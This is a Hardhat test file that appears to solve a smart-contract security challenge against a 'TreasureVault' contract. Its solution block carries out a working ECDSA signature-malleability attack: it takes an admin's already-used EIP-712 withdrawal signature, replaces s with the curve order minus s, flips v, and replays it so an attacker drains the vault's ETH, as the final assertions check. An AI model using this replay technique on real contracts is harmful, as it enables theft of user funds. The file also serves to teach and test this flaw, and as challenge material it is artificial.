import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let adminUser: Signer; // should not be used
let treasureVault: Contract;
let attackerStart;
let sig;

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin, adminUser] = accounts;

  // deploying core contracts
  let treasureVaultFactory = await ethers.getContractFactory('TreasureVault')
  treasureVault = await treasureVaultFactory.connect(admin).deploy()

  await admin.sendTransaction({to:treasureVault.address,value:precision.mul(2)})

  // admin generates signature for adminUser to withdraw funds from the TreasureVault
  let domain = {
    name: 'TreasureVault',
    version: '1',
    chainId: await treasureVault.getChainid(),
    verifyingContract: treasureVault.address
  }

  let types = {
    SendFundsWithAuth: [
      {name:'amount', type:'uint256'},
      {name:'nonce', type:'uint256'}
    ]
  }

  let values = {
    amount: precision.mul(1),
    nonce: 0,
  }

  let signature = await admin._signTypedData(domain, types, values)
  sig = ethers.utils.splitSignature(signature)

  await treasureVault.connect(adminUser).sendFundsWithAuth(precision.mul(1),0,sig.v,sig.r,sig.s)

  // getting starting attacker balance
  attackerStart = await ethers.provider.getBalance(await attacker.getAddress())

});

it("solves the challenge", async function () {

  let newS = BN.from('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141').sub(sig.s)
  newS = ethers.utils.hexlify(newS)
  let newV = sig.v == 28 ? 27 : 28

  await treasureVault.connect(attacker).sendFundsWithAuth(precision.mul(1),0,newV,sig.r,newS)

});

/// expected final state
after(async () => {

  // attacker drains ETH from contract
  expect(await ethers.provider.getBalance(await attacker.getAddress())).to.be.gt(attackerStart)
  expect(await ethers.provider.getBalance(treasureVault.address)).to.be.equal(0)

});